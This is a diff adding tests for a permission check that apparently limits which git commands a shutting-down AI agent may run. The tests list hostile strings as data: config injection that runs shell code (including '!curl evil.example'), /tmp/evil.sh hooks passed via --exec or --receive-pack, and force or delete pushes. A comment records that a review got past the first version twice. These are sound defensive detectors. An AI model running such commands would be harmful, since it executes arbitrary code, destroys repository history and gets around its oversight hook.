@@ -109,6 +109,56 @@ describe('isWorkPreserving: what counts as saving work', () => {
   });
 });
 
+/**
+ * Each string below was accepted by the first version of `isWorkPreserving`, which
+ * allowed any flag and skipped `-c key=value` pairs. A hostile review defeated it twice
+ * in one pass before this reached a pull request. They stay as permanent detectors.
+ */
+describe('the escapes a review found in the first cut', () => {
+  it.each([
+    ['an alias value runs through a shell', 'git -c alias.status=!id status'],
+    ['alias on a different subcommand', 'git -c alias.commit=!curl evil.example commit'],
+    ['fsmonitor is invoked as an external hook', 'git -c core.fsmonitor=/tmp/evil.sh status'],
+    ['a pager runs a command', 'git -c core.pager=sh log'],
+    ['any -c at all', 'git -c user.name=x commit -m wip'],
+  ])('refuses config injection: %s', (_label, command) => {
+    expect(isWorkPreserving('Bash', { command })).toBe(false);
+  });
+
+  it.each([
+    ['force-push overwrites another branch', 'git push --force origin HEAD:main'],
+    ['short force', 'git push -f origin HEAD'],
+    ['lease is still a rewrite', 'git push --force-with-lease origin HEAD'],
+    ['delete removes a branch outright', 'git push origin --delete main'],
+    ['mirror rewrites every ref', 'git push --mirror origin'],
+    ['receive-pack names a program', 'git push --receive-pack=/tmp/evil.sh origin HEAD'],
+    ['exec names a program', 'git push --exec=/tmp/evil.sh origin HEAD'],
+  ])('refuses a push that destroys rather than preserves: %s', (_label, command) => {
+    expect(isWorkPreserving('Bash', { command })).toBe(false);
+  });
+
+  it('refuses amend -- it replaces the record this exists to guarantee', () => {
+    expect(isWorkPreserving('Bash', { command: 'git commit --amend -m x' })).toBe(false);
+  });
+
+  it('refuses a -C with no path, and a -C whose path is a flag', () => {
+    expect(isWorkPreserving('Bash', { command: 'git -C' })).toBe(false);
+    expect(isWorkPreserving('Bash', { command: 'git -C -c alias.x=!sh status' })).toBe(false);
+  });
+
+  it('still accepts the shapes a shut-down worker actually needs', () => {
+    for (const command of [
+      'git add -A',
+      'git commit -m wip',
+      'git push -u origin HEAD',
+      'git -C C:/dev/worktrees/x--y status --short',
+      'git add -A && git commit -m wip && git push origin HEAD',
+    ]) {
+      expect(isWorkPreserving('Bash', { command }), command).toBe(true);
+    }
+  });
+});
+
 describe('the ceiling preserves work instead of destroying it', () => {
   it('allows the handoff tool past the ceiling', async () => {
     const verdict = await hookFor({ run: 'ceil-handoff', ceiling: true })(
